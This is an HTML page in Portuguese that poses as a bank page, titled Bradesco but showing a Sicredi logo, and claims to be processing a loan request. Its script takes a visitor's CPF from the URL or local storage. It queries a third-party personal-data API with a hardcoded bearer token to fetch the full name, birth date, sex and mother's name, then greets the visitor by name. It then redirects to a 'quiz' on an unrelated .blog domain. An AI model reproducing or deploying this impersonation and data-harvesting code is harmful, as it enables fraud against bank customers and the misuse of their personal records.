<!DOCTYPE html><html lang="pt-BR"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bradesco - Processando Solicita√ß√£o</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #00C247 0%, #00C247 50%, #00C247 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #008b00;
      overflow-x: hidden;
    }

    .loading-container {
      text-align: center;
      max-width: 600px;
      padding: 60px 40px;
      background: rgba(255, 255, 255, 0.95);
      border-radius: 25px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.3);
    }

    .logo {
      width: 120px;
      height: auto;
      margin-bottom: 40px;
      opacity: 0;
      animation: fadeInUp 1s ease-out 0.5s forwards;
    }

    .welcome-message {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 30px;
      color: #00C247;
      opacity: 0;
      animation: fadeInUp 1s ease-out 1s forwards;
    }

    .typewriter-container {
      min-height: 120px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 40px;
    }

    .typewriter-text {
      font-size: 20px;
      line-height: 1.6;
      color: #00C247;
      font-weight: 500;
      max-width: 500px;
    }

    .typewriter-cursor {
      animation: blink 1s infinite;
      color: #00C247;
      font-weight: bold;
    }

    .loading-dots {
      display: flex;
      justify-content: center;
      gap: 8px;
      margin-bottom: 40px;
      opacity: 0;
      animation: fadeInUp 1s ease-out 2s forwards;
    }

    .dot {
      width: 12px;
      height: 12px;
      background: linear-gradient(45deg, #00C247, #00C247);
      border-radius: 50%;
      animation: pulse 1.5s ease-in-out infinite;
    }

    .dot:nth-child(2) {
      animation-delay: 0.3s;
    }

    .dot:nth-child(3) {
      animation-delay: 0.6s;
    }
    .start-button {
      background: linear-gradient(45deg, #00C247, #00C247);
      color: white;
      border: none;
      padding: 18px 40px;
      font-size: 18px;
      font-weight: 600;
      border-radius: 50px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 10px 30px rgba(193, 0, 0, 0.3);
      opacity: 0;
      transform: translateY(20px);
      font-family: 'Inter', sans-serif;
      min-width: 200px;
    }

    .start-button:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 40px rgba(193, 0, 0, 0.4);
      background: linear-gradient(45deg, #008b00, #008b00);
    }

    .start-button:active {
      transform: translateY(-1px);
    }

    .start-button.show {
      animation: slideInUp 0.8s ease-out forwards;
    }

    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes slideInUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes blink {
      0%, 50% { opacity: 1; }
      51%, 100% { opacity: 0; }
    }

    @keyframes pulse {
      0%, 100% {
        transform: scale(1);
        opacity: 0.7;
      }
      50% {
        transform: scale(1.3);
        opacity: 1;
      }
    }

    .progress-bar {
      width: 100%;
      height: 4px;
      background: rgba(193, 0, 0, 0.2);
      border-radius: 2px;
      overflow: hidden;
      margin-bottom: 30px;
      opacity: 0;
      animation: fadeInUp 1s ease-out 1.5s forwards;
    }

    .progress-fill {
      height: 100%;
      background: linear-gradient(45deg, #008b00, #008b00);
      border-radius: 2px;
      width: 0%;
      animation: fillProgress 3s ease-out 2s forwards;
    }

    @keyframes fillProgress {
      to {
        width: 100%;
      }
    }

    @media (max-width: 768px) {
      .loading-container {
        margin: 20px;
        padding: 40px 20px;
      }

      .welcome-message {
        font-size: 24px;
      }

      .typewriter-text {
        font-size: 18px;
      }

      .start-button {
        padding: 16px 30px;
        font-size: 16px;
      }
    }
  </style>
</head>
<body>
  <div class="loading-container">
    <img src="images/sicredi-logo.png" alt="Sicredi" class="logo">
    
    <div class="progress-bar">
      <div class="progress-fill"></div>
    </div>

    <h1 class="welcome-message">
      Ol√° <span id="nomeUsuario">Cliente</span>!
    </h1>

    <div class="typewriter-container">
      <div class="typewriter-text" id="typewriter"></div>
    </div>

    <div class="loading-dots">
      <div class="dot"></div>
      <div class="dot"></div>
      <div class="dot"></div>
    </div>

    <button class="start-button" id="startButton" onclick="iniciarQuiz()">
      Iniciar
    </button>
  </div>
<script>
// üîé Fun√ß√£o para buscar nome (usa sessionStorage primeiro, e API s√≥ se necess√°rio)
async function consultarECarregarNome() {
    console.log('=== INICIANDO CONSULTA DE NOME ===');

    const urlParams = new URLSearchParams(window.location.search);
    const nomeFromUrl = urlParams.get('nome');
    const nomeCompletoFromUrl = urlParams.get('nomeCompleto');

    // ‚úÖ 1. Prioriza nome na URL (se existir)
    if (nomeFromUrl && nomeFromUrl !== 'Cliente') {
        console.log('‚úÖ Nome da URL:', nomeFromUrl);
        document.getElementById('nomeUsuario').textContent = decodeURIComponent(nomeFromUrl);
        return decodeURIComponent(nomeFromUrl);
    }

    // ‚úÖ 2. Verifica se j√° temos dados salvos no sessionStorage
    const dadosSalvos = {
        cpf: sessionStorage.getItem("cpf"),
        primeiroNome: sessionStorage.getItem("primeiroNome"),
        nomeCompleto: sessionStorage.getItem("nomeCompleto"),
        dataNascimento: sessionStorage.getItem("dataNascimento")
    };

    if (dadosSalvos.primeiroNome && dadosSalvos.cpf) {
        console.log("üìÅ Dados encontrados no sessionStorage:", dadosSalvos);
        document.getElementById("nomeUsuario").textContent = dadosSalvos.primeiroNome;
        return dadosSalvos.primeiroNome;
    }

    // ‚úÖ 3. Caso n√£o haja no sessionStorage, tenta obter CPF
    const cpf = localStorage.getItem('cpf') || urlParams.get('cpf');
    if (!cpf) {
        console.log('‚ùå CPF n√£o encontrado');
        document.getElementById('nomeUsuario').textContent = 'Cliente';
        return 'Cliente';
    }

    console.log('üåê Nenhum dado salvo, consultando API DataGet para CPF:', cpf);

    // ‚úÖ 4. Consulta a API apenas se necess√°rio
    try {
        const response = await fetch(`https://api.dataget.site/api/v1/cpf/${cpf.replace(/\D/g, '')}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer 5664016cd07486d17adea9f73884bf398a52b89593c33f114fd9c6bbddb3b26f'
            }
        });

        if (response.ok) {
            const data = await response.json();
            console.log('üìä Dados da API:', data);

            if (data?.NOME) {
                const primeiroNome = data.NOME.split(' ')[0];

                // üß† Salva no sessionStorage
                sessionStorage.setItem('cpf', cpf);
                sessionStorage.setItem('primeiroNome', primeiroNome);
                sessionStorage.setItem('nomeCompleto', data.NOME);
                sessionStorage.setItem('dataNascimento', data.NASC);

                sessionStorage.setItem('dadosAdicionais', JSON.stringify({
                    cpf: cpf,
                    sexo: data.SEXO,
                    nomeMae: data.NOME_MAE,
                    nascimento: data.NASC
                }));

                document.getElementById('nomeUsuario').textContent = primeiroNome;
                return primeiroNome;
            } else {
                console.warn('‚ö†Ô∏è Dados incompletos retornados da API');
            }
        } else {
            console.error('‚ùå Erro ao consultar API:', response.status);
        }
    } catch (error) {
        console.error('‚ùå Erro na requisi√ß√£o da API:', error);
    }

    // ‚úÖ 5. Fallback: define "Cliente" se nada for encontrado
    document.getElementById('nomeUsuario').textContent = 'Cliente';
    return 'Cliente';
}

// ‚ú® Efeito de digita√ß√£o
function typeWriter(element, text, speed = 50) {
    let i = 0;
    element.innerHTML = '';
    function type() {
        if (i < text.length) {
            element.innerHTML += text.charAt(i);
            i++;
            setTimeout(type, speed);
        } else {
            setTimeout(() => {
                element.innerHTML += '<span class="typewriter-cursor">|</span>';
                setTimeout(showStartButton, 1000);
            }, 500);
        }
    }
    type();
}

// ‚úÖ Mostra o bot√£o iniciar
function showStartButton() {
    const button = document.getElementById('startButton');
    button.classList.add('show');
}

// üöÄ Redireciona para o quiz
function iniciarQuiz() {
    const urlParams = new URLSearchParams(window.location.search);
    const utmParams = urlParams.toString();
    const fromTermos = document.referrer.includes('/termos/') || urlParams.has('from_termos');

    let redirectUrl = 'https://soliciteagora.blog/quiz';
    console.log('üîÑ Redirecionando para quiz...');
    if (utmParams) redirectUrl += '?' + utmParams;
    window.location.href = redirectUrl;
}

// üß† Inicializa√ß√£o
document.addEventListener('DOMContentLoaded', async function () {
    console.log('üöÄ P√°gina carregada, iniciando...');
    await consultarECarregarNome();

    const fromTermos = document.referrer.includes('/termos/') ||
        new URLSearchParams(window.location.search).has('from_termos');

    const texto = fromTermos
        ? "Perfeito! Agora estamos processando sua solicita√ß√£o e preparando tudo para voc√™."
        : "Para concluirmos sua solicita√ß√£o de empr√©stimo, precisamos fazer algumas perguntinhas r√°pidas.";

    setTimeout(() => {
        typeWriter(document.getElementById('typewriter'), texto, 50);
    }, 1000);
});
</script>

</body></html>